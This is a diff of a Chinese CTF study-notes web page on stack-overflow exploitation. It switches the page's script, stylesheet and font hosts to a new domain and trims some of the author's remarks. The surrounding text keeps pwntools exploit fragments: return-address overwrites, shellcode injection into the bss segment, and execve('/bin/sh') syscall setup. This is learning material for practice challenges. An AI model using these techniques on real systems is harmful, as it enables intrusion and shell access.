@@ -22,7 +22,7 @@
 
 	
 	
-<link rel="shortcut icon" href="https://m00nwandering.life/img/favicon-32x32.png" type="image/png" />
+<link rel="shortcut icon" href="https://wander1ng.com/img/favicon-32x32.png" type="image/png" />
 
 
 	
@@ -43,13 +43,13 @@
 
 
 
-<link rel="stylesheet" href='https://m00nwandering.life/lib/katex.min.css' crossorigin="anonymous">
+<link rel="stylesheet" href='https://wander1ng.com/lib/katex.min.css' crossorigin="anonymous">
 
 
-<script defer src='https://m00nwandering.life/lib/katex.min.js' crossorigin="anonymous"></script>
+<script defer src='https://wander1ng.com/lib/katex.min.js' crossorigin="anonymous"></script>
 
 
-<script defer src='https://m00nwandering.life/lib/contrib/auto-render.min.js'
+<script defer src='https://wander1ng.com/lib/contrib/auto-render.min.js'
 crossorigin="anonymous"
 onload='renderMathInElement(document.body);'></script>
 
@@ -81,7 +81,7 @@ onload='renderMathInElement(document.body);'></script>
 				});
 			}
 			s.parentNode.insertBefore(o, s);
-		})('https:\/\/m00nwandering.life\/lib\/pangu.min.js', function () {
+		})('https:\/\/wander1ng.com\/lib\/pangu.min.js', function () {
 			pangu.spacingPage();
 		});
 	</script>
@@ -93,8 +93,8 @@ onload='renderMathInElement(document.body);'></script>
 			font-family: "FancyTitleFont";
 			font-style: normal;
 			font-display: swap;
-			src: url('https://m00nwandering.life/fonts/exampleFont.woff2') format('woff2'),
-				url('https://m00nwandering.life/fonts/exampleFont.woff') format('woff');
+			src: url('https://wander1ng.com/fonts/exampleFont.woff2') format('woff2'),
+				url('https://wander1ng.com/fonts/exampleFont.woff') format('woff');
 		}
 		 
 		  
@@ -105,9 +105,9 @@ onload='renderMathInElement(document.body);'></script>
 			font-weight: 300;
 			font-display: swap;
 			src: local('Noto Serif CJK SC Light'), local('NotoSerifCJK-Light'),
-				url('https://m00nwandering.life/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2') format('woff2'),
+				url('https://wander1ng.com/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2') format('woff2'),
 				 
-				url('https://m00nwandering.life/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff') format('woff');
+				url('https://wander1ng.com/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff') format('woff');
 			 
 		}
 
@@ -118,9 +118,9 @@ onload='renderMathInElement(document.body);'></script>
 			font-weight: 400;
 			font-display: swap;
 			src: local('Noto Serif CJK SC'), local('NotoSerifCJK-Regular'),
-				url('https://m00nwandering.life/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2') format('woff2'),
+				url('https://wander1ng.com/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2') format('woff2'),
 				 
-				url('https://m00nwandering.life/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff') format('woff');
+				url('https://wander1ng.com/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff') format('woff');
 			 
 		}
 
@@ -131,9 +131,9 @@ onload='renderMathInElement(document.body);'></script>
 			font-weight: 500;
 			font-display: swap;
 			src: local('Noto Serif CJK SC Medium'), local('NotoSerifCJK-Medium'),
-				url('https://m00nwandering.life/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2') format('woff2'),
+				url('https://wander1ng.com/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2') format('woff2'),
 				 
-				url('https://m00nwandering.life/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff') format('woff');
+				url('https://wander1ng.com/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff') format('woff');
 			 
 		}
 	</style>
@@ -148,7 +148,7 @@ onload='renderMathInElement(document.body);'></script>
 				
 <div>
 	<h2>
-		<a href="https://m00nwandering.life/" title="清夜无尘の一方天地" class="heading font-cursive icon">清夜无尘の一方天地</a>
+		<a href="https://wander1ng.com/" title="清夜无尘の一方天地" class="heading font-cursive icon">清夜无尘の一方天地</a>
 	</h2>
 </div>
 <h1 class="pt-2">CTF Wiki</h1>
@@ -319,10 +319,9 @@ target = 0x0804863a
 sh.sendline(&#39;A&#39; * (0x6c+4) + p32(target))
 
 sh.interactive()
-</code></pre><p><strong>我觉得这道题倒是让我弄明白了buf的表示，位置关系。</strong></p>
-<p><strong>上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。</strong></p>
+</code></pre><p><strong>上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。</strong></p>
 <p><strong>第二种类型ret2shellcode：</strong></p>
-<p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的<strong>汇编代码</strong>，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(<a href="http://shellcraft.sh/">shellcraft.sh</a>())。</p>
+<p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的<strong>汇编代码</strong>，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。</p>
 <pre tabindex="0"><code>int __cdecl main(int argc, const char **argv, const char **envp)
 {
   int v4; // [sp+1Ch] [bp-64h]@1
@@ -384,8 +383,7 @@ buf2_addr = 0x804a080
 ## shellcode先放入，剩余的再用&#39;A&#39;填充至112长度。
 sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))
 sh.interactive()
-</code></pre><p><strong><u>shellcode放进去了不需要别的操作吗？这个buf2_addr指的是什么？如何通过调试确定需要填充的长度？</u></strong></p>
-<p><strong>第三种类型：ret2syscall：</strong>
+</code></pre><p><strong>第三种类型：ret2syscall：</strong>
 即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。</p>
 <pre tabindex="0"><code>execve(&#34;/bin/sh&#34;,NULL,NULL)
 </code></pre><p>由于该程序是 32 位，所以我们需要使得</p>
@@ -559,12 +557,12 @@ sh.interactive()
 <p>ret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。</p>
 <p><strong>0X06&ndash;MISC:</strong></p>
 <p>1.最简单栈溢出，一套工具解决。</p>
-<p>python <a href="http://pattern.py/">pattern.py</a> create 150
+<p>python pattern.py create 150
 gdb X
 run
 (input)
 q(uit)
-python <a href="http://pattern.py/">pattern.py</a> offset (address)</p>
+python pattern.py offset (address)</p>
 <p>即可得到溢出地址</p>
 <p>2.注意是返回地址，不是/bin/sh本身在栈上。</p>
 <p>3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。</p>
@@ -806,7 +804,7 @@ sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’
 	<div class="text-sm text-gray-500 leading-tight a-gray">
 		Copyright © 2019–2024
 		<br />
-		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 8849 words in this page.
+		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 8768 words in this page.
 	</div>
 </div>
 
